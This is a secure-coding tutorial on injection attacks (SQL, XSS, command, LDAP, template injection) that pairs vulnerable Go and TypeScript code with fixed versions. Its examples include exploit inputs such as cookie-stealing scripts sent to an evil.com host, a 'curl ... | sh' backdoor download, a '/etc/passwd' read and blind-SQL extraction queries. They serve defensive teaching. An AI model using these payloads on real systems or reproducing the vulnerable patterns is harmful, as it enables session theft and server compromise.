# Injection Attacks Deep Dive

## The Ventriloquist Attack

Injection is like a ventriloquist. The attacker makes your application say things you didn't intend by sneaking commands into data inputs. Your application thinks it's processing harmless user data, but embedded in that data are instructions that your interpreter (SQL engine, browser, shell) executes faithfully.

Every injection attack follows the same pattern:
1. The application takes user input
2. That input is concatenated into a command or query
3. The interpreter can't distinguish data from instructions
4. The attacker's instructions execute with the application's privileges

---

## SQL Injection

SQL injection is the granddaddy of injection attacks. It's been in the OWASP Top 10 since the first list in 2003, and it still causes breaches today.

### Classic SQL Injection

**How it works step by step:**

Your application builds a SQL query using string concatenation:
```
"SELECT * FROM users WHERE username = '" + input + "'"
```

Normal input: `alice`
```sql
SELECT * FROM users WHERE username = 'alice'
```

Malicious input: `' OR 1=1 --`
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```

The `'` closes the string. `OR 1=1` makes the condition always true. `--` comments out the rest. The query returns every user in the table.

**Go — Vulnerable:**

```go
func login(w http.ResponseWriter, r *http.Request) {
    username := r.FormValue("username")
    password := r.FormValue("password")

    query := fmt.Sprintf(
        "SELECT id, role FROM users WHERE username = '%s' AND password = '%s'",
        username, password,
    )

    var userID int
    var role string
    err := db.QueryRow(query).Scan(&userID, &role)
    if err != nil {
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    json.NewEncoder(w).Encode(map[string]interface{}{
        "user_id": userID,
        "role":    role,
    })
}
```

**The exploit:**

```
POST /login
username=admin'--&password=anything
```

This produces:
```sql
SELECT id, role FROM users WHERE username = 'admin'--' AND password = 'anything'
```

Everything after `--` is a comment. The password check is completely bypassed.

**Go — Secure (parameterized query):**

```go
func login(w http.ResponseWriter, r *http.Request) {
    username := r.FormValue("username")
    password := r.FormValue("password")

    var userID int
    var role string
    var hashedPassword string

    err := db.QueryRow(
        "SELECT id, role, password_hash FROM users WHERE username = $1",
        username,
    ).Scan(&userID, &role, &hashedPassword)

    if err != nil {
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    if err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password)); err != nil {
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    json.NewEncoder(w).Encode(map[string]interface{}{
        "user_id": userID,
        "role":    role,
    })
}
```

With `$1`, the database driver sends the query structure and data separately. The database knows `$1` is data, not SQL. Even if the input contains SQL syntax, it's treated as a literal string value.

**TypeScript — Vulnerable:**

```typescript
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const users = await prisma.$queryRawUnsafe(
    `SELECT id, role FROM users WHERE username = '${username}' AND password = '${password}'`
  );

  if (users.length === 0) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  res.json(users[0]);
});
```

**TypeScript — Secure (Prisma):**

```typescript
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (typeof username !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "Invalid input" });
  }

  const user = await prisma.user.findUnique({
    where: { username },
    select: { id: true, role: true, passwordHash: true },
  });

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  res.json({ id: user.id, role: user.role });
});
```

**TypeScript — Secure (Knex with parameterized query):**

```typescript
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (typeof username !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "Invalid input" });
  }

  const user = await knex("users")
    .where({ username })
    .select("id", "role", "password_hash")
    .first();

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const valid = await bcrypt.compare(password, user.password_hash);
  if (!valid) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  res.json({ id: user.id, role: user.role });
});
```

### Blind SQL Injection

In classic SQL injection, the attacker sees the query results directly. In blind SQL injection, the application doesn't return data — but the attacker can still extract information by asking yes/no questions.

**Boolean-based blind:**

```
/products?id=1 AND 1=1    -- page loads normally (true)
/products?id=1 AND 1=2    -- page loads differently or errors (false)
```

Now the attacker asks questions:
```
/products?id=1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10
```

If the page loads normally, the admin password is longer than 10 characters. Repeat with binary search until you know the exact length. Then extract character by character:

```
/products?id=1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 100
```

**Time-based blind:**

When even the boolean difference isn't visible:
```
/products?id=1; IF (SELECT LENGTH(password) FROM users WHERE username='admin') > 10 WAITFOR DELAY '0:0:5'
```

If the response takes 5 seconds, the condition is true. Slow but effective.

### Second-Order SQL Injection

This is the sneakiest variant. The malicious input is stored safely but injected later when used in a different query.

**Step 1:** Attacker registers with username: `admin'--`

The registration query uses parameterized statements, so this is stored safely:
```sql
INSERT INTO users (username, password) VALUES ($1, $2)
```

**Step 2:** Attacker triggers a password change. The application looks up the current user's username and uses it in a query:

```go
func changePassword(userID int, newPassword string) error {
    var username string
    db.QueryRow("SELECT username FROM users WHERE id = $1", userID).Scan(&username)

    query := fmt.Sprintf(
        "UPDATE users SET password = '%s' WHERE username = '%s'",
        newPassword, username,
    )
    _, err := db.Exec(query)
    return err
}
```

The username `admin'--` is already in the database. When plugged into the UPDATE:
```sql
UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
```

The attacker just changed the admin's password. The fix: use parameterized queries everywhere, not just for user-facing inputs.

---

## Cross-Site Scripting (XSS)

XSS is injection into the browser. Instead of injecting SQL into a database, you inject JavaScript into a web page that other users view. The browser trusts the script because it comes from the legitimate website.

### Reflected XSS

The malicious script is part of the request and immediately reflected in the response.

**Vulnerable endpoint:**

```go
func search(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    fmt.Fprintf(w, "<h1>Search results for: %s</h1>", query)
}
```

**The exploit:**

```
https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

The server reflects the script tag into the HTML. The victim's browser executes it, sending their session cookie to the attacker.

**TypeScript — Vulnerable:**

```typescript
app.get("/search", (req, res) => {
  const query = req.query.q as string;
  res.send(`<h1>Search results for: ${query}</h1>`);
});
```

**TypeScript — Secure (output encoding):**

```typescript
import escapeHtml from "escape-html";

app.get("/search", (req, res) => {
  const query = req.query.q;
  if (typeof query !== "string") {
    return res.status(400).send("Invalid query");
  }
  res.send(`<h1>Search results for: ${escapeHtml(query)}</h1>`);
});
```

### Stored XSS

The malicious script is stored in the database and served to every user who views the page. Much more dangerous than reflected XSS because it doesn't require tricking a user into clicking a link.

**The attack flow:**

1. Attacker posts a comment: `Great article! <script>new Image().src='https://evil.com/steal?c='+document.cookie</script>`
2. The comment is stored in the database
3. Every user who views the page loads the malicious script
4. Their cookies are silently sent to the attacker

**Go — Vulnerable:**

```go
func renderComments(w http.ResponseWriter, r *http.Request) {
    rows, err := db.Query("SELECT author, body FROM comments WHERE post_id = $1", postID)
    if err != nil {
        http.Error(w, "Error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()

    for rows.Next() {
        var author, body string
        rows.Scan(&author, &body)
        fmt.Fprintf(w, "<div class='comment'><b>%s</b>: %s</div>", author, body)
    }
}
```

**Go — Secure (html/template auto-escaping):**

```go
var commentTmpl = template.Must(template.New("comments").Parse(`
{{range .Comments}}
<div class="comment"><b>{{.Author}}</b>: {{.Body}}</div>
{{end}}
`))

func renderComments(w http.ResponseWriter, r *http.Request) {
    rows, err := db.Query("SELECT author, body FROM comments WHERE post_id = $1", postID)
    if err != nil {
        http.Error(w, "Error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()

    var comments []Comment
    for rows.Next() {
        var c Comment
        rows.Scan(&c.Author, &c.Body)
        comments = append(comments, c)
    }

    commentTmpl.Execute(w, map[string]interface{}{
        "Comments": comments,
    })
}
```

Go's `html/template` package automatically escapes HTML entities. `<script>` becomes `&lt;script&gt;`, which the browser displays as text rather than executing.

### DOM-Based XSS

The vulnerability is entirely in client-side JavaScript. The server never sees the malicious payload.

**Vulnerable JavaScript:**

```javascript
const name = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").innerHTML = "Hello, " + name;
```

**The exploit:**

```
https://example.com/page?name=<img src=x onerror=alert(document.cookie)>
```

The `innerHTML` assignment parses the string as HTML, creating an `img` element with an error handler that executes JavaScript.

**Secure JavaScript (using DOMPurify):**

```javascript
import DOMPurify from "dompurify";

const name = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").innerHTML =
  "Hello, " + DOMPurify.sanitize(name);
```

**Even more secure (avoid innerHTML entirely):**

```javascript
const name = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").textContent = "Hello, " + name;
```

`textContent` never parses HTML. It's the safest option when you don't need HTML rendering.

### XSS Prevention: Content Security Policy

CSP is a defense-in-depth layer. Even if an XSS vulnerability exists, CSP can prevent the injected script from executing.

**Go:**

```go
func cspMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'")
        next.ServeHTTP(w, r)
    })
}
```

**TypeScript:**

```typescript
import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
    },
  })
);
```

With `script-src 'self'`, only scripts loaded from your own domain execute. Inline scripts (the typical XSS payload) are blocked.

---

## Command Injection

Command injection happens when user input is passed to a system shell. This is the most dangerous injection type because it gives the attacker direct access to the operating system.

**Go — Vulnerable:**

```go
func ping(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")
    cmd := exec.Command("sh", "-c", "ping -c 4 "+host)
    output, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "Ping failed", http.StatusInternalServerError)
        return
    }
    w.Write(output)
}
```

**The exploit:**

```
/ping?host=google.com; cat /etc/passwd
```

The shell sees: `ping -c 4 google.com; cat /etc/passwd` — two commands, both executed.

Escalation: `; curl https://evil.com/backdoor.sh | sh` downloads and executes a script.

**Go — Secure (avoid shell, pass args directly):**

```go
func ping(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")

    matched, err := regexp.MatchString(`^[a-zA-Z0-9.\-]+$`, host)
    if err != nil || !matched {
        http.Error(w, "Invalid host", http.StatusBadRequest)
        return
    }

    cmd := exec.Command("ping", "-c", "4", host)
    output, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "Ping failed", http.StatusInternalServerError)
        return
    }
    w.Write(output)
}
```

Key differences:
1. `exec.Command("ping", "-c", "4", host)` passes arguments directly to the `ping` binary — no shell involved. Semicolons are just part of the argument string.
2. Input validation with a whitelist regex rejects anything that isn't a hostname character.

**TypeScript — Vulnerable:**

```typescript
import { exec } from "child_process";

app.get("/ping", (req, res) => {
  const host = req.query.host as string;
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    if (error) {
      return res.status(500).send("Ping failed");
    }
    res.send(stdout);
  });
});
```

**TypeScript — Secure:**

```typescript
import { execFile } from "child_process";

app.get("/ping", (req, res) => {
  const host = req.query.host;

  if (typeof host !== "string" || !/^[a-zA-Z0-9.\-]+$/.test(host)) {
    return res.status(400).send("Invalid host");
  }

  execFile("ping", ["-c", "4", host], (error, stdout) => {
    if (error) {
      return res.status(500).send("Ping failed");
    }
    res.send(stdout);
  });
});
```

`execFile` bypasses the shell entirely. Arguments are passed as an array directly to the process.

---

## LDAP Injection

LDAP (Lightweight Directory Access Protocol) is used in enterprise environments for user directories and authentication (Active Directory, OpenLDAP). LDAP injection works the same way as SQL injection but targets LDAP queries.

**How LDAP queries work:**

```
(&(username=alice)(password=secret))
```

This searches for an entry where username is "alice" AND password is "secret."

**The exploit:**

Input: `*)(|(&`
```
(&(username=*)(|(& )(password=anything))
```

Or simpler — input: `admin)(&)` for the username:
```
(&(username=admin)(&))(password=anything)
```

The `(&)` is always true, bypassing the password check.

**Prevention:**

```go
func sanitizeLDAP(input string) string {
    replacer := strings.NewReplacer(
        `\`, `\5c`,
        `*`, `\2a`,
        `(`, `\28`,
        `)`, `\29`,
        "\x00", `\00`,
    )
    return replacer.Replace(input)
}

func authenticate(username, password string) (bool, error) {
    safeUser := sanitizeLDAP(username)
    safePass := sanitizeLDAP(password)

    filter := fmt.Sprintf("(&(uid=%s)(userPassword=%s))", safeUser, safePass)
    searchRequest := ldap.NewSearchRequest(
        "dc=example,dc=com",
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases, 0, 0, false,
        filter,
        []string{"dn"},
        nil,
    )
    result, err := conn.Search(searchRequest)
    if err != nil {
        return false, fmt.Errorf("ldap search: %w", err)
    }
    return len(result.Entries) == 1, nil
}
```

---

## Server-Side Template Injection (SSTI)

Template engines (Jinja2, Go templates, Pug, EJS) process templates on the server. If user input is placed directly into a template string (not into a template variable), the template engine may execute it.

**Python (Jinja2) — Vulnerable:**

```python
template = f"Hello {user_input}"
return render_template_string(template)
```

If `user_input` is `{{7*7}}`, the output is `Hello 49`. The template engine evaluated the expression.

Escalation in Jinja2:
```
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This can lead to remote code execution.

**Go — Vulnerable:**

```go
func greet(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    tmplStr := fmt.Sprintf("Hello, %s!", name)
    tmpl, _ := template.New("greet").Parse(tmplStr)
    tmpl.Execute(w, nil)
}
```

If `name` is `{{.}}` or more complex template directives, the engine processes them.

**Go — Secure:**

```go
var greetTmpl = template.Must(template.New("greet").Parse("Hello, {{.Name}}!"))

func greet(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    greetTmpl.Execute(w, map[string]string{"Name": name})
}
```

The template is fixed at compile time. User input flows through `{{.Name}}`, which is treated as data and auto-escaped. The template structure itself never changes based on user input.

**TypeScript (EJS) — Vulnerable:**

```typescript
app.get("/greet", (req, res) => {
  const name = req.query.name as string;
  const html = ejs.render(`Hello, ${name}!`);
  res.send(html);
});
```

**TypeScript (EJS) — Secure:**

```typescript
app.get("/greet", (req, res) => {
  const name = req.query.name;
  if (typeof name !== "string") {
    return res.status(400).send("Invalid name");
  }
  res.render("greet", { name });
});
```

With a separate template file that uses `<%= name %>` (which auto-escapes), user input is always data, never template code.

---

## The Injection Defense Playbook

Every injection attack comes down to mixing data with instructions. Here's the universal defense:

### 1. Parameterize Everything

Never concatenate user input into queries, commands, or templates. Use the parameterization mechanism provided by your tool:

| Context | Defense |
|---------|---------|
| SQL | Parameterized queries (`$1`, `?`) |
| Shell | `exec.Command` / `execFile` with args array |
| HTML | Template engine auto-escaping |
| LDAP | Escape special characters |
| Templates | Static templates + data binding |

### 2. Validate Input

Accept only what you expect. Use allowlists, not blocklists:

```go
func validateUsername(username string) error {
    if len(username) < 3 || len(username) > 30 {
        return errors.New("username must be 3-30 characters")
    }
    if !regexp.MustCompile(`^[a-zA-Z0-9_]+$`).MatchString(username) {
        return errors.New("username can only contain letters, numbers, and underscores")
    }
    return nil
}
```

### 3. Encode Output

When displaying data in HTML, JavaScript, URLs, or CSS, encode it for the output context:

```typescript
function encodeForContext(
  value: string,
  context: "html" | "js" | "url"
): string {
  switch (context) {
    case "html":
      return escapeHtml(value);
    case "js":
      return JSON.stringify(value);
    case "url":
      return encodeURIComponent(value);
  }
}
```

### 4. Apply Least Privilege

Even if injection succeeds, limit the damage:
- Database accounts with minimal permissions (SELECT only if writes aren't needed)
- Application processes running as non-root
- Network segmentation so the database isn't accessible from the internet

### 5. Defense in Depth

Layer your defenses. Any single layer can fail:

```
[Input Validation] → [Parameterized Query] → [Least Privilege DB Account] → [WAF] → [Monitoring]
```

If validation misses something, the parameterized query catches it. If somehow both fail, the restricted database account limits what the attacker can access. The WAF may block known attack patterns. Monitoring detects the attempt.

No single defense is perfect. Stack them.
